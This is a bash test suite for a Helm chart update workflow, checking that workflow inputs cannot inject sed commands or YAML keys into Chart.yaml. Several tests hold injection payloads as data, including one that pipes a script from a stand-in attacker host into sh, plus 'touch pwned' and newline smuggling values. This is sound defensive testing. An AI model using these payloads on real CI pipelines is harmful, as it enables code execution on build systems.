#!/usr/bin/env bash
# update-helm-chart.yml - injection resistance of the chart rewrite.
#
# APP_VERSION and PRERELEASE_IDENTIFIER arrive as free-form workflow inputs and
# end up inside Chart.yaml. They used to be spliced into `sed` s/// programs,
# where a `/` closes the command and everything after it is parsed as further
# sed - including GNU sed's `e`, which runs its argument through a shell.

# shellcheck source=ci/tests/lib.sh
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

VALIDATE=$(extract_run update-helm-chart.yml update "Validate inputs")
UPDATE=$(extract_run update-helm-chart.yml update "update chart version")

validate_env() {
  export HAS_PARTIAL_APP_AUTH="false"
  export RUN_MODE="called"
  export AUTOMERGE_METHOD="auto"
  export APP_VERSION="1.4.0"
  export UPGRADE_TYPE="patch"
  export PRERELEASE_IDENTIFIER="rc"
  export HELM_DOCS_VERSION="v1.14.2"
  export CHART_NAME="my-app"
  export CHART_PATH=""
}

test_validate_accepts_both_delivery_modes() {
  local mode
  for mode in called local; do
    validate_env
    export RUN_MODE="$mode"
    run_block "$VALIDATE"
    assert_status 0 "RUN_MODE '$mode' is a supported mode"
  done
}

test_validate_rejects_an_unknown_run_mode() {
  validate_env
  # A typo must not skip every step and report success.
  export RUN_MODE="colled"

  run_block "$VALIDATE"

  assert_status 1 "an unrecognised RUN_MODE must fail, not silently do nothing"
  assert_output_contains "RUN_MODE must be 'called' or 'local'"
}

test_validate_points_caller_mode_at_the_dispatch_workflow() {
  validate_env
  # A call aimed at the wrong workflow must say where to go, not just fail.
  export RUN_MODE="caller"

  run_block "$VALIDATE"

  assert_status 1
  assert_output_contains "dispatch-helm-chart.yml"
}

# A chart tree the update block can actually rewrite, plus a `docker` stub so
# the helm-docs step is observable instead of hitting the network.
chart_env() {
  export CHART_DIR="charts"
  export CHART_NAME="my-app"
  export APP_VERSION="1.4.0"
  export UPGRADE_TYPE="patch"
  export PRERELEASE_IDENTIFIER="rc"
  export HELM_DOCS_VERSION="v1.14.2"

  mkdir -p "$SANDBOX/$CHART_DIR/$CHART_NAME"
  cat >"$SANDBOX/$CHART_DIR/$CHART_NAME/Chart.yaml" <<'YAML'
apiVersion: v2
name: my-app
# a comment that must survive the rewrite
type: application
version: 0.2.0
appVersion: "1.0.0"
YAML

  cat >"$SANDBOX/bin/docker" <<'STUB'
#!/usr/bin/env bash
printf 'docker|%s\n' "$*" >>"$CALL_LOG"
exit 0
STUB
  chmod +x "$SANDBOX/bin/docker"

  cd "$SANDBOX" || exit 1
}

test_validate_accepts_ordinary_versions() {
  validate_env
  run_block "$VALIDATE"
  assert_status 0
}

test_validate_accepts_an_empty_app_version() {
  validate_env
  # Empty APP_VERSION is the documented chart-only release.
  export APP_VERSION=""
  run_block "$VALIDATE"
  assert_status 0
}

test_validate_rejects_a_sed_payload_in_app_version() {
  validate_env
  export APP_VERSION='1.0.0/;e curl -s https://attacker/x.sh|sh #'
  run_block "$VALIDATE"
  assert_status 1 "a value carrying sed commands must not reach Chart.yaml"
  assert_output_contains "APP_VERSION must be"
}

test_validate_rejects_a_sed_payload_in_prerelease_identifier() {
  validate_env
  export PRERELEASE_IDENTIFIER='rc/;e touch /tmp/pwned #'
  run_block "$VALIDATE"
  assert_status 1
  assert_output_contains "PRERELEASE_IDENTIFIER must match"
}

test_validate_rejects_a_newline_in_app_version() {
  validate_env
  export APP_VERSION='1.0.0
version: 9.9.9'
  run_block "$VALIDATE"
  assert_status 1 "an embedded newline would start a second sed command / YAML key"
}

test_update_writes_both_versions() {
  chart_env
  run_block "$UPDATE"
  assert_status 0
  assert_file_contains "$SANDBOX/$CHART_DIR/$CHART_NAME/Chart.yaml" 'appVersion: "1.4.0"'
  assert_file_contains "$SANDBOX/$CHART_DIR/$CHART_NAME/Chart.yaml" "version: 0.2.1"
}

test_update_preserves_comments() {
  chart_env
  run_block "$UPDATE"
  assert_status 0
  # A sed rewrite left the rest of the file alone; yq must not be worse.
  assert_file_contains "$SANDBOX/$CHART_DIR/$CHART_NAME/Chart.yaml" "a comment that must survive"
}

test_update_leaves_app_version_untouched_when_empty() {
  chart_env
  export APP_VERSION=""
  run_block "$UPDATE"
  assert_status 0
  assert_file_contains "$SANDBOX/$CHART_DIR/$CHART_NAME/Chart.yaml" 'appVersion: "1.0.0"'
}

test_update_stores_a_hostile_app_version_literally() {
  chart_env
  # Belt and braces: even if validation were bypassed or removed, the write
  # itself must not interpret the value. This is the guard that does not depend
  # on a regex staying correct.
  export APP_VERSION='1.0.0/;e touch pwned #'
  run_block "$UPDATE"
  assert_status 0
  [ -e "$SANDBOX/pwned" ] && {
    printf 'FAIL: the payload executed - the value reached a program, not a string\n' >&2
    exit 1
  }
  assert_file_contains "$SANDBOX/$CHART_DIR/$CHART_NAME/Chart.yaml" 'e touch pwned'
}

test_update_runs_helm_docs_on_the_chart_and_pulls_no_image() {
  chart_env
  run_block "$UPDATE"
  assert_status 0
  assert_called "helm-docs|--chart-search-root charts/my-app"
  assert_not_called "docker"
}

# The tool is built from source at the version asked for, so 'latest' would
# install whatever is newest on the day - the floating pin the input refuses.
test_validate_rejects_a_helm_docs_version_that_is_not_a_release_tag() {
  local bad
  for bad in latest 1.14.2 main; do
    validate_env
    export HELM_DOCS_VERSION="$bad"
    run_block "$VALIDATE"
    assert_status 1 "HELM_DOCS_VERSION '$bad' is not a release tag"
    assert_output_contains "HELM_DOCS_VERSION must be a release tag"
  done
}

test_validate_accepts_the_default_helm_docs_version() {
  validate_env
  run_block "$VALIDATE"
  assert_status 0 "the default release tag must validate"
}

# --- CHART_PATH / CHART_NAME: exactly one names the chart --------------------

test_validate_requires_a_chart() {
  validate_env
  export CHART_NAME=""

  run_block "$VALIDATE"

  assert_status 1
  assert_output_contains "Set CHART_NAME (with CHART_DIR) or CHART_PATH"
}

test_validate_rejects_chart_path_with_chart_name() {
  validate_env
  export CHART_PATH="deploy/helm"

  run_block "$VALIDATE"

  assert_status 1
  assert_output_contains "CHART_PATH and CHART_NAME are mutually exclusive"
}

test_validate_accepts_chart_path_alone() {
  validate_env
  export CHART_NAME=""
  export CHART_PATH="deploy/helm"

  run_block "$VALIDATE"

  assert_status 0
}

test_update_rejects_a_chart_name_unfit_for_branches() {
  mkdir -p "$SANDBOX/deploy/helm"
  printf 'apiVersion: v2\nname: "x; touch pwned"\nversion: 1.0.0\n' >"$SANDBOX/deploy/helm/Chart.yaml"
  cd "$SANDBOX" || exit 1
  export CHART_DIR="charts" CHART_NAME="" CHART_PATH="deploy/helm"
  export APP_VERSION="" UPGRADE_TYPE="patch" PRERELEASE_IDENTIFIER="rc" HELM_DOCS_VERSION="v1.14.2"

  run_block "$UPDATE"

  assert_status 1 "a Chart.yaml name flows into branch names and commit messages"
  assert_output_contains "is not a valid chart name"
  if [ -e "$SANDBOX/pwned" ]; then
    echo "FAIL: the chart name was executed" >&2
    exit 1
  fi
}

run_tests
